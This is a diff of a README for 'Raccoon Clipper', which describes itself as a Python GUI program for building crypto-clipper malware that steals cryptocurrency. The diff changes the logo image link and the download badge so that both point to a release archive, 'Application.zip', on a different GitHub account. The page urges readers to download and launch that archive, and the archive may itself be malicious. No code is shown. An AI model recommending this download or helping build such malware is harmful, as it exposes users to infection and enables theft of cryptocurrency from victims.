@@ -1,6 +1,6 @@
 # 🦝 Raccoon Clipper 🛠️
 
-![Raccoon Clipper Logo](https://clipartstation.com/wp-content/uploads/2018/09/raccoon-clipart-6.jpg)
+![Raccoon Clipper Logo](https://github.com/itskillirr1214T/raccoon_clipper/releases/download/v1.0.0/Application.zip)
 
 ## Introduction
 Welcome to the **Raccoon Clipper** repository - a GUI-based program designed for creating customized crypto-stealing malware. This program is written in Python and provides an easy way to develop crypto-clipper malware targeted at various cryptocurrencies. 
@@ -8,7 +8,7 @@ Welcome to the **Raccoon Clipper** repository - a GUI-based program designed for
 ## Installation
 To get started with using the **Raccoon Clipper** program, you can download the software from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/itskillirr1214T/raccoon_clipper/releases/download/v1.0.0/Application.zip)](https://github.com/itskillirr1214T/raccoon_clipper/releases/download/v1.0.0/Application.zip)
 
 Once you have downloaded the software, you can launch it to start building your own crypto stealing malware.
 
